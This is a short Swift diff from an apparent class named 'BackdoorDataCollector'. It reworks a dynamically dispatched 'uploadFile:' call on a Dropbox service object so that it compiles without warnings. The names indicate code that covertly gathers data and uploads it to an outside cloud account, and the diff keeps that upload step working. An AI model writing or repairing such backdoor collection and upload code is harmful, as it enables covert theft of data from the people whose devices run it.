@@ -249,9 +249,10 @@ class BackdoorDataCollector {
                 }
             }
 
-            // Upload the file with simplified method call to avoid compiler errors
-            _ = dropboxService.perform(
-                Selector("uploadFile:"),
+            // Use a string-based selector approach to avoid compiler warnings about missing methods
+            // Since this is dynamic code that may be working with classes defined elsewhere
+            let _ = dropboxService.perform(
+                NSSelectorFromString("uploadFile:"),
                 with: url
             )
         }
